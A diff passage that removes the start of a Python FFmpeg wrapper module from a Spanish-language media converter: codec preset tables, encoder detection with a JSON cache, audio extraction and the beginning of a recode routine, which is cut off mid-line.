@@ -1,1135 +1,370 @@
-﻿import json
-import tempfile
-import subprocess
-import threading
-import os
-import re
-import sys
-import time
-from .exceptions import UserCancelledError
-from .constants import FORMAT_MUXER_MAP
-from main import FFMPEG_BIN_DIR
-
-CODEC_PROFILES = {
-    "Video": {
-        "H.264 (x264)": {
-            "libx264": {
-                "Alta Calidad (CRF 18)": ['-c:v', 'libx264', '-preset', 'slow', '-crf', '18', '-pix_fmt', 'yuv420p'],
-                "Calidad Media (CRF 23)": ['-c:v', 'libx264', '-preset', 'medium', '-crf', '23', '-pix_fmt', 'yuv420p'],
-                "Calidad Rápida (CRF 28)": ['-c:v', 'libx264', '-preset', 'veryfast', '-crf', '28', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.265 (x265)": {
-            "libx265": {
-                "Calidad Máxima (CRF 16)": ['-c:v', 'libx265', '-preset', 'slow', '-crf', '16', '-tag:v', 'hvc1', '-pix_fmt', 'yuv420p'],
-                "Calidad Alta (CRF 20)": ['-c:v', 'libx265', '-preset', 'slow', '-crf', '20', '-tag:v', 'hvc1', '-pix_fmt', 'yuv420p'],
-                "Calidad Equilibrada (CRF 20)": ['-c:v', 'libx265', '-preset', 'medium', '-crf', '20', '-tag:v', 'hvc1', '-pix_fmt', 'yuv420p'],
-                "Calidad Media (CRF 24)": ['-c:v', 'libx265', '-preset', 'medium', '-crf', '24', '-tag:v', 'hvc1', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "Apple ProRes (prores_aw) (Velocidad)": {
-            "prores_aw": {
-                "422 Proxy":    ['-c:v', 'prores_aw', '-profile:v', '0', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 LT":       ['-c:v', 'prores_aw', '-profile:v', '1', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 Standard": ['-c:v', 'prores_aw', '-profile:v', '2', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 HQ":       ['-c:v', 'prores_aw', '-profile:v', '3', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "4444":         ['-c:v', 'prores_aw', '-profile:v', '4', '-pix_fmt', 'yuva444p10le', '-threads', '0'],
-                "4444 XQ":      ['-c:v', 'prores_aw', '-profile:v', '5', '-pix_fmt', 'yuva444p10le', '-threads', '0']
-            }, "container": ".mov"
-        },
-        "Apple ProRes (prores_ks) (Precisión)": {
-            "prores_ks": {
-                "422 Proxy":    ['-c:v', 'prores_ks', '-profile:v', '0', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 LT":       ['-c:v', 'prores_ks', '-profile:v', '1', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 Standard": ['-c:v', 'prores_ks', '-profile:v', '2', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "422 HQ":       ['-c:v', 'prores_ks', '-profile:v', '3', '-pix_fmt', 'yuv422p10le', '-threads', '0'],
-                "4444 Liviano (Alpha 8-bit)": ['-c:v', 'prores_ks', '-profile:v', '4', '-pix_fmt', 'yuva444p10le', '-alpha_bits', '8', '-quant_mat', 'proxy', '-bits_per_mb', '128', '-threads', '0'],
-                "4444":         ['-c:v', 'prores_ks', '-profile:v', '4', '-pix_fmt', 'yuva444p10le', '-threads', '0'],
-                "4444 XQ":      ['-c:v', 'prores_ks', '-profile:v', '5', '-pix_fmt', 'yuva444p10le', '-threads', '0']
-            }, "container": ".mov"
-        },
-        "DNxHD (dnxhd)": {
-            "dnxhd": {
-                "1080p25 (145 Mbps)":     ['-c:v', 'dnxhd', '-b:v', '145M', '-pix_fmt', 'yuv422p'],
-                "1080p29.97 (145 Mbps)":  ['-c:v', 'dnxhd', '-b:v', '145M', '-pix_fmt', 'yuv422p'],
-                "1080i50 (120 Mbps)":     ['-c:v', 'dnxhd', '-b:v', '120M', '-pix_fmt', 'yuv422p', '-flags', '+ildct+ilme', '-top', '1'],
-                "1080i59.94 (120 Mbps)":  ['-c:v', 'dnxhd', '-b:v', '120M', '-pix_fmt', 'yuv422p', '-flags', '+ildct+ilme', '-top', '1'],
-                "720p50 (90 Mbps)":       ['-c:v', 'dnxhd', '-b:v', '90M', '-pix_fmt', 'yuv422p'],
-                "720p59.94 (90 Mbps)":    ['-c:v', 'dnxhd', '-b:v', '90M', '-pix_fmt', 'yuv422p']
-            }, "container": ".mov"
-        },
-        "DNxHR (dnxhd)": {
-            "dnxhd": {
-                "LB (8-bit 4:2:2)":    ['-c:v', 'dnxhd', '-profile:v', 'dnxhr_lb', '-pix_fmt', 'yuv422p'],
-                "SQ (8-bit 4:2:2)":    ['-c:v', 'dnxhd', '-profile:v', 'dnxhr_sq', '-pix_fmt', 'yuv422p'],
-                "HQ (8-bit 4:2:2)":    ['-c:v', 'dnxhd', '-profile:v', 'dnxhr_hq', '-pix_fmt', 'yuv422p'],
-                "HQX (10-bit 4:2:2)":  ['-c:v', 'dnxhd', '-profile:v', 'dnxhr_hqx', '-pix_fmt', 'yuv422p10le'],
-                "444 (10-bit 4:4:4)":  ['-c:v', 'dnxhd', '-profile:v', 'dnxhr_444', '-pix_fmt', 'yuv444p10le']
-            }, "container": ".mov"
-        },
-        "VP8 (libvpx)": {
-             "libvpx": {
-                "Calidad Alta (CRF 10)": ['-c:v', 'libvpx', '-crf', '10', '-b:v', '0'],
-                "Calidad Media (CRF 20)": ['-c:v', 'libvpx', '-crf', '20', '-b:v', '0'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR"
-             }, "container": ".webm"
-        },
-        "VP9 (libvpx-vp9)": {
-            "libvpx-vp9": {
-                "Calidad Alta (CRF 28)": ['-c:v', 'libvpx-vp9', '-crf', '28', '-b:v', '0'],
-                "Calidad Media (CRF 33)": ['-c:v', 'libvpx-vp9', '-crf', '33', '-b:v', '0'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR"
-            }, "container": ".webm"
-        },
-        "AV1 (libaom-av1)": {
-            "libaom-av1": {
-                "Calidad Alta (CRF 28)": ['-c:v', 'libaom-av1', '-strict', 'experimental', '-cpu-used', '4', '-crf', '28'],
-                "Calidad Media (CRF 35)": ['-c:v', 'libaom-av1', '-strict', 'experimental', '-cpu-used', '6', '-crf', '35'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR"
-            }, "container": ".mkv"
-        },
-        "H.264 (NVIDIA NVENC)": {
-            "h264_nvenc": {
-                # AÑADIDO: '-pix_fmt', 'yuv420p' al final de las listas
-                "Calidad Alta (CQP 18)": ['-c:v', 'h264_nvenc', '-preset', 'p7', '-rc', 'vbr', '-cq', '18', '-pix_fmt', 'yuv420p'],
-                "Calidad Media (CQP 23)": ['-c:v', 'h264_nvenc', '-preset', 'p5', '-rc', 'vbr', '-cq', '23', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.265/HEVC (NVIDIA NVENC)": {
-            "hevc_nvenc": {
-                "Calidad Alta (CQP 20)": ['-c:v', 'hevc_nvenc', '-preset', 'p7', '-rc', 'vbr', '-cq', '20', '-pix_fmt', 'yuv420p'],
-                "Calidad Media (CQP 24)": ['-c:v', 'hevc_nvenc', '-preset', 'p5', '-rc', 'vbr', '-cq', '24', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "AV1 (NVENC)": {
-            "av1_nvenc": {
-                "Calidad Alta (CQP 24)": ['-c:v', 'av1_nvenc', '-preset', 'p7', '-rc', 'vbr', '-cq', '24'],
-                "Calidad Media (CQP 28)": ['-c:v', 'av1_nvenc', '-preset', 'p5', '-rc', 'vbr', '-cq', '28'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.264 (AMD AMF)": {
-            "h264_amf": {
-                # AÑADIDO: '-pix_fmt', 'yuv420p'
-                "Alta Calidad": ['-c:v', 'h264_amf', '-quality', 'quality', '-rc', 'cqp', '-qp_i', '18', '-qp_p', '18', '-pix_fmt', 'yuv420p'],
-                "Calidad Balanceada": ['-c:v', 'h264_amf', '-quality', 'balanced', '-rc', 'cqp', '-qp_i', '23', '-qp_p', '23', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.265/HEVC (Intel QSV)": {
-            "hevc_qsv": {
-                "Alta Calidad": ['-c:v', 'hevc_qsv', '-preset', 'veryslow', '-global_quality', '20', '-pix_fmt', 'yuv420p'],
-                "Calidad Media": ['-c:v', 'hevc_qsv', '-preset', 'medium', '-global_quality', '24', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "AV1 (AMF)": {
-            "av1_amf": {
-                "Alta Calidad": ['-c:v', 'av1_amf', '-quality', 'quality', '-rc', 'cqp', '-qp_i', '28', '-qp_p', '28'],
-                "Calidad Balanceada": ['-c:v', 'av1_amf', '-quality', 'balanced', '-rc', 'cqp', '-qp_i', '32', '-qp_p', '32'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.264 (Intel QSV)": {
-            "h264_qsv": {
-                # AÑADIDO: '-pix_fmt', 'yuv420p'
-                "Alta Calidad": ['-c:v', 'h264_qsv', '-preset', 'veryslow', '-global_quality', '18', '-pix_fmt', 'yuv420p'],
-                "Calidad Media": ['-c:v', 'h264_qsv', '-preset', 'medium', '-global_quality', '23', '-pix_fmt', 'yuv420p'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.265/HEVC (Intel QSV)": {
-            "hevc_qsv": {
-                "Alta Calidad": ['-c:v', 'hevc_qsv', '-preset', 'veryslow', '-global_quality', '20'],
-                "Calidad Media": ['-c:v', 'hevc_qsv', '-preset', 'medium', '-global_quality', '24'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "AV1 (QSV)": {
-            "av1_qsv": {
-                "Calidad Alta": ['-c:v', 'av1_qsv', '-global_quality', '25', '-preset', 'slow'],
-                "Calidad Media": ['-c:v', 'av1_qsv', '-global_quality', '30', '-preset', 'medium'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "VP9 (QSV)": {
-            "vp9_qsv": {
-                "Calidad Alta": ['-c:v', 'vp9_qsv', '-global_quality', '25', '-preset', 'slow'],
-                "Calidad Media": ['-c:v', 'vp9_qsv', '-global_quality', '30', '-preset', 'medium'],
-                "Bitrate Personalizado (VBR)": "CUSTOM_BITRATE_VBR",
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.264 (Apple VideoToolbox)": {
-            "h264_videotoolbox": {
-                "Alta Calidad": ['-c:v', 'h264_videotoolbox', '-profile:v', 'high', '-q:v', '70'],
-                "Calidad Media": ['-c:v', 'h264_videotoolbox', '-profile:v', 'main', '-q:v', '50'],
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "H.265/HEVC (Apple VideoToolbox)": {
-            "hevc_videotoolbox": {
-                "Alta Calidad": ['-c:v', 'hevc_videotoolbox', '-profile:v', 'main', '-q:v', '80'],
-                "Calidad Media": ['-c:v', 'hevc_videotoolbox', '-profile:v', 'main', '-q:v', '65'],
-                "Bitrate Personalizado (CBR)": "CUSTOM_BITRATE_CBR"
-            }, "container": ".mp4"
-        },
-        "GIF (animado)": {
-            "gif": { 
-                "Baja Calidad (Rápido)": ['-vf', 'fps=15,scale=480:-1'],
-                "Calidad Web (480p, 15fps)": ['-filter_complex', '[0:v] fps=15,scale=480:-1,split [a][b];[a] palettegen [p];[b][p] paletteuse'],
-                "Calidad Media (540p, 24fps)": ['-filter_complex', '[0:v] fps=24,scale=540:-1,split [a][b];[a] palettegen [p];[b][p] paletteuse'],
-                "Calidad Alta (720p, 30fps)": ['-filter_complex', '[0:v] fps=30,scale=720:-1,split [a][b];[a] palettegen [p];[b][p] paletteuse'],
-                "Personalizado": "CUSTOM_GIF" 
-            }, "container": ".gif"
-        },
-        "XDCAM HD422": {
-            "mpeg2video": {
-                "1080i50 (50 Mbps)": ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv422p', '-b:v', '50M', '-flags', '+ildct+ilme', '-top', '1', '-minrate', '50M', '-maxrate', '50M'],
-                "1080p25 (50 Mbps)": ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv422p', '-b:v', '50M', '-minrate', '50M', '-maxrate', '50M'],
-                "720p50 (50 Mbps)":  ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv422p', '-b:v', '50M', '-minrate', '50M', '-maxrate', '50M']
-            }, "container": ".mxf"
-        },
-        "XDCAM HD 35": {
-            "mpeg2video": {
-                "1080i50 (35 Mbps)": ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv420p', '-b:v', '35M', '-flags', '+ildct+ilme', '-top', '1', '-minrate', '35M', '-maxrate', '35M'],
-                "1080p25 (35 Mbps)": ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv420p', '-b:v', '35M', '-minrate', '35M', '-maxrate', '35M'],
-                "720p50 (35 Mbps)":  ['-c:v', 'mpeg2video', '-pix_fmt', 'yuv420p', '-b:v', '35M', '-minrate', '35M', '-maxrate', '35M']
-            }, "container": ".mxf"
-        },
-        "AVC-Intra 100 (x264)": {
-            "libx264": {
-                "1080p (100 Mbps)": ['-c:v', 'libx264', '-preset', 'veryfast', '-profile:v', 'high422', '-level', '4.1', '-b:v', '100M', '-minrate', '100M', '-maxrate', '100M', '-bufsize', '2M', '-g', '1', '-keyint_min', '1', '-pix_fmt', 'yuv422p10le'],
-                "720p (50 Mbps)":   ['-c:v', 'libx264', '-preset', 'veryfast', '-profile:v', 'high422', '-level', '3.1', '-b:v', '50M', '-minrate', '50M', '-maxrate', '50M', '-bufsize', '1M', '-g', '1', '-keyint_min', '1', '-pix_fmt', 'yuv422p10le']
-            }, "container": ".mov"
-        },
-        "GoPro CineForm": {
-            "cfhd": {
-                "Baja": ['-c:v', 'cfhd', '-quality', '1'], "Media": ['-c:v', 'cfhd', '-quality', '4'], "Alta": ['-c:v', 'cfhd', '-quality', '6']
-            }, "container": ".mov"
-        },
-        "QT Animation (qtrle)": { "qtrle": { "Estándar": ['-c:v', 'qtrle'] }, "container": ".mov" },
-        "HAP": { "hap": { "Estándar": ['-c:v', 'hap'] }, "container": ".mov" },
-    },
-    "Audio": {
-        "AAC": {
-            "aac": {
-                "Máxima Calidad (~320kbps)": ['-c:a', 'aac', '-b:a', '320k'],
-                "Alta Calidad (~256kbps)": ['-c:a', 'aac', '-b:a', '256k'],
-                "Buena Calidad (~192kbps)": ['-c:a', 'aac', '-b:a', '192k'],
-                "Calidad Media (~128kbps)": ['-c:a', 'aac', '-b:a', '128k'],
-                "Calidad Baja (~128kbps)": ['-c:a', 'aac', '-b:a', '128k']
-            }, "container": ".m4a"
-        },
-        "MP3 (libmp3lame)": {
-            "libmp3lame": {
-                "320kbps (CBR)": ['-c:a', 'libmp3lame', '-b:a', '320k'],
-                "256kbps (VBR)": ['-c:a', 'libmp3lame', '-q:a', '0'],
-                "192kbps (CBR)": ['-c:a', 'libmp3lame', '-b:a', '192k'],
-                "128kbps (CBR)": ['-c:a', 'libmp3lame', '-b:a', '128k']
-            }, "container": ".mp3"
-        },
-        "Opus (libopus)": {
-            "libopus": {
-                "Calidad Transparente (~256kbps)": ['-c:a', 'libopus', '-b:a', '256k'],
-                "Calidad Alta (~192kbps)": ['-c:a', 'libopus', '-b:a', '192k'],
-                "Calidad Media (~128kbps)": ['-c:a', 'libopus', '-b:a', '128k']
-            }, "container": ".opus"
-        },
-        "Vorbis (libvorbis)": {
-            "libvorbis": {
-                "Calidad Muy Alta (q8)": ['-c:a', 'libvorbis', '-q:a', '8'],
-                "Calidad Alta (q6)": ['-c:a', 'libvorbis', '-q:a', '6'],
-                "Calidad Media (q4)": ['-c:a', 'libvorbis', '-q:a', '4']
-            }, "container": ".ogg"
-        },
-        "AC-3 (Dolby Digital)": {
-            "ac3": {
-                "Stereo (192kbps)": ['-c:a', 'ac3', '-b:a', '192k'],
-                "Stereo (256kbps)": ['-c:a', 'ac3', '-b:a', '256k'],
-                "Surround 5.1 (448kbps)": ['-c:a', 'ac3', '-b:a', '448k', '-ac', '6'],
-                "Surround 5.1 (640kbps)": ['-c:a', 'ac3', '-b:a', '640k', '-ac', '6']
-            }, "container": ".ac3"
-        },
-        "ALAC (Apple Lossless)": {
-            "alac": {
-                "Estándar (Sin Pérdida)": ['-c:a', 'alac']
-            }, "container": ".m4a"
-        },
-        "FLAC (Sin Pérdida)": {
-            "flac": {
-                "Nivel de Compresión 5": ['-c:a', 'flac', '-compression_level', '5'],
-                "Nivel de Compresión 8 (Más Lento)": ['-c:a', 'flac', '-compression_level', '8']
-            }, "container": ".flac"
-        },
-        "WAV (Sin Comprimir)": {
-            "pcm_s16le": {
-                "PCM 16-bit": ['-c:a', 'pcm_s16le'],
-                "PCM 24-bit": ['-c:a', 'pcm_s24le']
-            }, "container": ".wav"
-        },
-        "WMA v2 (Windows Media)": {
-            "wmav2": {
-                "Calidad Alta (192kbps)": ['-c:a', 'wmav2', '-b:a', '192k'],
-                "Calidad Media (128kbps)": ['-c:a', 'wmav2', '-b:a', '128k']
-            }, "container": ".wma"
-        }
-    }
-}
-
-
-ENCODER_CACHE_SCHEMA_VERSION = 3
-FASTSTART_CONTAINERS = {".mp4", ".m4a", ".m4v"}
-
-
-def encoder_cache_is_valid(cache_data, ffmpeg_version, app_version):
-    return bool(
-        isinstance(cache_data, dict)
-        and cache_data.get("schema_version") == ENCODER_CACHE_SCHEMA_VERSION
-        and cache_data.get("ffmpeg_version") == ffmpeg_version
-        and cache_data.get("app_version") == app_version
-        and cache_data.get("encoders")
-    )
-
-
-def pixel_format_has_alpha(pixel_format):
-    normalized = str(pixel_format or "").strip().lower()
-    return any(
-        alpha_marker in normalized
-        for alpha_marker in ("argb", "abgr", "rgba", "bgra", "yuva", "gbrap")
-    )
-
-
-def recode_parameters_preserve_alpha(ffmpeg_params):
-    params = list(ffmpeg_params or [])
-
-    def option_value(option):
-        try:
-            return str(params[params.index(option) + 1]).lower()
-        except (ValueError, IndexError):
-            return ""
-
-    video_codec = option_value("-c:v")
-    if video_codec in {"copy", "qtrle"}:
-        return True
-    if video_codec == "hap" and option_value("-format") == "hap_alpha":
-        return True
-    return pixel_format_has_alpha(option_value("-pix_fmt"))
-
-
-def normalize_recode_parameters(ffmpeg_params, output_container=None):
-    """Añade opciones seguras que deben compartir todos los flujos de recodificación."""
-    params = list(ffmpeg_params or [])
-
-    if "-map_metadata" not in params:
-        params.extend(["-map_metadata", "0"])
-    if "-map_chapters" not in params:
-        params.extend(["-map_chapters", "0"])
-
-    normalized_container = str(output_container or "").strip().lower()
-    if normalized_container and "-f" not in params:
-        muxer = FORMAT_MUXER_MAP.get(normalized_container, normalized_container.lstrip("."))
-        if muxer:
-            params.extend(["-f", muxer])
-    if normalized_container in FASTSTART_CONTAINERS and "-movflags" not in params:
-        params.extend(["-movflags", "+faststart"])
-
-    return params
-
-
-def validate_recode_result_info(media_info, mode, expected_duration=0):
-    """Valida que FFmpeg haya generado un medio reproducible y completo."""
-    if not isinstance(media_info, dict):
-        raise ValueError("FFprobe no devolvió información del archivo recodificado.")
-
-    streams = media_info.get("streams") or []
-    if mode == "Solo Audio":
-        if not any(stream.get("codec_type") == "audio" for stream in streams):
-            raise ValueError("El archivo recodificado no contiene una pista de audio válida.")
-    elif not any(stream.get("codec_type") == "video" for stream in streams):
-        raise ValueError("El archivo recodificado no contiene una pista de video válida.")
-
-    try:
-        output_duration = float((media_info.get("format") or {}).get("duration") or 0)
-        target_duration = float(expected_duration or 0)
-    except (TypeError, ValueError):
-        output_duration = 0
-        target_duration = 0
-
-    if output_duration <= 0:
-        raise ValueError("El archivo recodificado tiene una duración inválida.")
-
-    if target_duration > 0:
-        tolerance = max(2.0, min(10.0, target_duration * 0.02))
-        if abs(output_duration - target_duration) > tolerance:
-            raise ValueError(
-                "La duración del archivo recodificado no coincide con el original "
-                f"({output_duration:.2f}s frente a {target_duration:.2f}s)."
-            )
-
-    return True
-
-
-class FFmpegProcessor:
-    def __init__(self, app_version=None, cache_dir=None):
-        ffmpeg_exe_name = "ffmpeg.exe" if os.name == 'nt' else "ffmpeg"
-        self.ffmpeg_path = os.path.join(FFMPEG_BIN_DIR, ffmpeg_exe_name)
-
-        self.gpu_vendor = None
-        self.is_detection_complete = False
-        self.available_encoders = {"CPU": {"Video": {}, "Audio": {}}, "GPU": {"Video": {}}}
-        self.current_process = None
-        # Caché de detección de códecs
-        self.app_version = app_version or "unknown"
-        self.cache_dir = cache_dir  # Carpeta %APPDATA%/Xomacito (o None en modo sin caché)
-    def cancel_current_process(self):
-        """
-        Cancela el proceso de FFmpeg que se esté ejecutando actualmente.
-        """
-        if self.current_process and self.current_process.poll() is None:
-            print("DEBUG: Enviando señal de terminación al proceso de FFmpeg...")
-            try:
-                self.current_process.terminate()
-                self.current_process.wait(timeout=5) 
-                print("DEBUG: Proceso de FFmpeg terminado.")
-            except Exception as e:
-                print(f"ERROR: No se pudo terminar el proceso de FFmpeg: {e}")
-            self.current_process = None
-
-    def run_detection_async(self, callback):
-        threading.Thread(target=self._detect_encoders, args=(callback,), daemon=True).start()
-
-    def _detect_encoders(self, callback):
-        try:
-            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-
-            # ── 1. Obtener versión de FFmpeg (valida que existe Y sirve de clave de caché) ──
-            version_bytes = subprocess.check_output(
-                [self.ffmpeg_path, '-version'],
-                stderr=subprocess.STDOUT,
-                creationflags=creationflags,
-                cwd=os.path.dirname(self.ffmpeg_path)
-            )
-            ffmpeg_version_str = version_bytes.decode('utf-8', errors='ignore').split('\n')[0].strip()
-
-            # ── 2. Intentar cargar desde caché ──────────────────────────────────────────────
-            if self.cache_dir:
-                cache_path = os.path.join(self.cache_dir, "encoder_cache.json")
-                try:
-                    if os.path.exists(cache_path):
-                        with open(cache_path, 'r', encoding='utf-8') as f:
-                            cache_data = json.load(f)
-                        if encoder_cache_is_valid(
-                            cache_data,
-                            ffmpeg_version_str,
-                            self.app_version,
-                        ):
-                            self.available_encoders = cache_data["encoders"]
-                            self.gpu_vendor = cache_data.get("gpu_vendor")
-                            self.is_detection_complete = True
-                            print(f"INFO: Caché de códecs cargado (FFmpeg: {ffmpeg_version_str}). Se omitió 'ffmpeg -encoders'.")
-                            callback(True, "Detección completada (caché).")
-                            return
-                except Exception as e:
-                    print(f"ADVERTENCIA: No se pudo leer el caché de encoders, se re-detectará: {e}")
-
-            # ── 3. Sin caché válido: detectar ejecutando 'ffmpeg -encoders' ─────────────────
-            all_encoders_output = subprocess.check_output(
-                [self.ffmpeg_path, '-encoders'],
-                text=True,
-                encoding='utf-8',
-                stderr=subprocess.STDOUT,
-                creationflags=creationflags,
-                cwd=os.path.dirname(self.ffmpeg_path)
-            )
-
-            # Guardar log de texto (comportamiento original)
-            try:
-                if getattr(sys, 'frozen', False):
-                    base_path = os.path.dirname(sys.executable)
-                else:
-                    base_path = os.path.dirname(os.path.abspath(__file__))
-                log_path = os.path.join(base_path, "ffmpeg_encoders_log.txt")
-                with open(log_path, "w", encoding="utf-8") as f:
-                    f.write("--- ENCODERS DETECTADOS POR FFmpeg ---\n")
-                    f.write(all_encoders_output)
-                print(f"DEBUG: Se ha guardado un registro de los códecs de FFmpeg en {log_path}")
-            except Exception as e:
-                print(f"ADVERTENCIA: No se pudo escribir el log de códecs de FFmpeg: {e}")
-
-            # Parsear resultados (igual que antes)
-            for category, codecs in CODEC_PROFILES.items():
-                for friendly_name, details in codecs.items():
-                    ffmpeg_codec_name = next((key for key in details if key != 'container'), None)
-                    if not ffmpeg_codec_name:
-                        continue
-                    search_pattern = r"^\s[A-Z\.]{6}\s+" + re.escape(ffmpeg_codec_name) + r"\s"
-                    if re.search(search_pattern, all_encoders_output, re.MULTILINE):
-                        proc_type = "GPU" if "nvenc" in ffmpeg_codec_name or "qsv" in ffmpeg_codec_name or "amf" in ffmpeg_codec_name or "videotoolbox" in ffmpeg_codec_name else "CPU"
-                        if proc_type == "GPU" and self.gpu_vendor is None:
-                            if "nvenc" in ffmpeg_codec_name: self.gpu_vendor = "NVIDIA"
-                            elif "qsv" in ffmpeg_codec_name: self.gpu_vendor = "Intel"
-                            elif "amf" in ffmpeg_codec_name: self.gpu_vendor = "AMD"
-                            elif "videotoolbox" in ffmpeg_codec_name: self.gpu_vendor = "Apple"
-                        target_category = self.available_encoders[proc_type].get(category, {})
-                        target_category[friendly_name] = details
-                        self.available_encoders[proc_type][category] = target_category
-
-            # ── 4. Guardar caché para la próxima apertura ────────────────────────────────────
-            if self.cache_dir:
-                cache_path = os.path.join(self.cache_dir, "encoder_cache.json")
-                try:
-                    cache_data = {
-                        "schema_version": ENCODER_CACHE_SCHEMA_VERSION,
-                        "ffmpeg_version": ffmpeg_version_str,
-                        "app_version": self.app_version,
-                        "gpu_vendor": self.gpu_vendor,
-                        "encoders": self.available_encoders
-                    }
-                    with open(cache_path, 'w', encoding='utf-8') as f:
-                        json.dump(cache_data, f, indent=2, ensure_ascii=False)
-                    print(f"INFO: Caché de códecs guardado en {cache_path} (FFmpeg: {ffmpeg_version_str}, App: {self.app_version})")
-                except Exception as e:
-                    print(f"ADVERTENCIA: No se pudo guardar el caché de encoders: {e}")
-
-            self.is_detection_complete = True
-            callback(True, "Detección completada.")
-
-        except (FileNotFoundError, subprocess.CalledProcessError) as e:
-            self.is_detection_complete = True
-            callback(False, "Error: ffmpeg no está instalado o no se encuentra en el PATH.")
-        except Exception as e:
-            self.is_detection_complete = True
-            callback(False, f"Error inesperado durante la detección: {e}")
-
-    def extract_audio(self, input_file, output_file, duration, progress_callback, cancellation_event: threading.Event):
-        """
-        Extrae la pista de audio de un archivo de video sin recodificar.
-        Usa '-c:a copy' para una operación extremadamente rápida.
-        """
-        process = None
-        try:
-            if cancellation_event.is_set():
-                raise UserCancelledError("Extracción de audio cancelada antes de iniciar.")
-
-            command = [
-                self.ffmpeg_path, '-y', '-nostdin', '-progress', '-', '-i', input_file,
-                '-vn',  
-                '-c:a', 'copy',  
-                '-map_metadata', '-1', 
-                '-acodec', 'copy',
-                output_file
-            ]
-
-            print("--- Comando FFmpeg para extracción de audio ---")
-            print(" ".join(command))
-            print("---------------------------------------------")
-
-            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            error_output_buffer = []
-            process = subprocess.Popen(
-                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                text=True, encoding='utf-8', errors='ignore', creationflags=creationflags
-            )
-            self.current_process = process
-
-            def read_stream_into_buffer(stream, buffer):
-                for line in iter(stream.readline, ''):
-                    buffer.append(line.strip())
-            stdout_thread = threading.Thread(target=self._read_stdout_for_progress, args=(process.stdout, progress_callback, cancellation_event, duration), daemon=True)
-            stderr_thread = threading.Thread(target=read_stream_into_buffer, args=(process.stderr, error_output_buffer), daemon=True)
-            stdout_thread.start()
-            stderr_thread.start()
-            while process.poll() is None:
-                if cancellation_event.is_set():
-                    self.cancel_current_process()
-                    raise UserCancelledError("Extracción de audio cancelada por el usuario.")
-                time.sleep(0.1)
-            stdout_thread.join()
-            stderr_thread.join()
-            if process.returncode != 0:
-                raise Exception(f"FFmpeg falló al extraer audio: {' '.join(error_output_buffer)}")
-            return output_file
-        except UserCancelledError as e:
-            raise e
-        except Exception as e:
-            self.cancel_current_process()
-            raise e
-        finally:
-            if process:
-                if process.stdout: process.stdout.close()
-                if process.stderr: process.stderr.close()
-            self.current_process = None
-
-    def execute_recode(self, options, progress_callback, cancellation_event: threading.Event):
-        process = None
-        try:
-            if cancellation_event.is_set():
-                raise UserCancelledError("Recodificación cancelada por el usuario antes de iniciar.")
-            input_file = options['input_file']
-            output_file = os.path.normpath(options['output_file'])
-            try:
-                requested_duration = float(options.get('duration') or 0)
-            except (TypeError, ValueError):
-                requested_duration = 0
-            media_info = None
-            try:
-                media_info = self.get_local_media_info(input_file)
-                source_duration = float(media_info['format']['duration'])
-            except (Exception, KeyError, TypeError):
-                source_duration = 0
-
-            progress_duration = requested_duration or source_duration
-            
-            command = [self.ffmpeg_path, '-y', '-nostdin', '-progress', '-']
